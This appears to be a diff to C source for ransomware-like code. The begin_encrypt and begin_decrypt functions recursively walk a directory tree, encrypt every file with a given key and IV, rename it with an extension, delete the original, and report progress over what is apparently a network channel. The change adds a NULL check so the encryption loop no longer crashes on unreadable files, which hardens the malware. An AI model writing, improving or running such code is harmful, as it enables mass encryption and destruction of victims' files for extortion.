@@ -49,17 +49,20 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ext) == NULL) {
             toVisit = linkStr(path, dir->d_name, 1);
             if (begin_encrypt(channel, toVisit, key, iv) == 0) {
-                newName = linkStr(toVisit, ext, 0);
                 old = fopen(toVisit, "rb");
-                newone = fopen(newName, "wb");
 
-                evp_encrypt(old, newone, key, iv);
-                deleteFile(toVisit);
+                if (old != NULL) {
+                    newName = linkStr(toVisit, ext, 0);
+                    newone = fopen(newName, "wb");
 
-                fclose(old);
-                fclose(newone);
+                    evp_encrypt(old, newone, key, iv);
+                    deleteFile(toVisit);
 
-                free(newName);
+                    fclose(old);
+                    fclose(newone);
+
+                    free(newName);
+                }
             } else {
                 process_length = snprintf((char *)NULL, 0, "Encrypting %s\n", dir->d_name);
                 process = (char *)calloc(process_length+1, sizeof(char));
@@ -90,17 +93,20 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
         if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
             toVisit = linkStr(path, dir->d_name, 1);
             if (begin_decrypt(channel, toVisit, key, iv) == 0) {
-                newName = removeLastChars(toVisit, strlen(ext));
                 old = fopen(toVisit, "rb");
-                newone = fopen(newName, "wb");
 
-                evp_decrypt(old, newone, key, iv);
-                deleteFile(toVisit);
+                if (old != NULL) {
+                    newName = removeLastChars(toVisit, strlen(ext));
+                    newone = fopen(newName, "wb");
 
-                fclose(old);
-                fclose(newone);
+                    evp_decrypt(old, newone, key, iv);
+                    deleteFile(toVisit);
 
-                free(newName);
+                    fclose(old);
+                    fclose(newone);
+
+                    free(newName);
+                }
             } else {
                 process_length = snprintf((char *)NULL, 0, "Decrypting %s\n", dir->d_name);
                 process = (char *)calloc(process_length+1, sizeof(char));
